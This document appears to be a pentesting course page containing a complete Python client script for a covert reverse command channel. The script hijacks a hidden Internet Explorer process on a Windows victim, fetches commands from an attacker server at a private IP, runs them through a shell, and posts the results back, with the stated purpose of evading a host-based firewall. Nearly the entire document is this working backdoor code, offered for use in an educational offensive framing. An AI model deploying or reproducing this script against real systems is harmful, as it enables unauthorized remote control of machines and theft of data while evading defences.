---
title: Hickjack the Internet Explorer process to bypass an host-based firewall
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - python
  - python pentesting
  - scripting
  - reverse shell
  - bypassing techniques
  - host based firewall
---

# Hickjack the Internet Explorer process to bypass an host-based firewall

For our script to bypass a host-based firewall (based on an ACL), we will hickjack the Internet Explorer process to conceal our traffick and bypass it.



## Client side

Make sure that the victim machine (a windows 10) has installed these two python libraries: pypiwin32 and pywin32.

To be run on our victim's machine.

```python
# Python For Offensive PenTest: A Complete Practical Course  - All rights reserved 
# Follow me on LinkedIn  https://jo.linkedin.com/in/python2

from win32com.client import Dispatch
from time import sleep
import subprocess

ie = Dispatch("InternetExplorer.Application") # Create browser instance.
ie.Visible = 0 # Make it invisible [ run in background ] (1= visible)

# Paramaeters for POST
dURL = "http://192.168.0.152"  
Flags = 0
TargetFrame = 0


while True:
    ie.Navigate("http://192.168.0.152") # Navigate to our kali web server (the attacker machine) to grab the hacker commands
    while ie.ReadyState != 4: # Wait for browser to finish loading.
        sleep(1)

    command = ie.Document.body.innerHTML 
    command = command.encode() # encode the command
    if 'terminate' in command.decode():
        ie.Quit() # quit the IE and end up the process
        break
    else:
        CMD = subprocess.Popen(command.decode(), shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        Data = CMD.stdout.read()
        PostData = memoryview( Data ) # in order to submit or post data using COM technique , it requires to  buffer the data first using memoryview
        ie.Navigate(dURL, Flags, TargetFrame, PostData) # we post the comamnd execution result along with the post parameters which we defined eariler..

    sleep(3)

```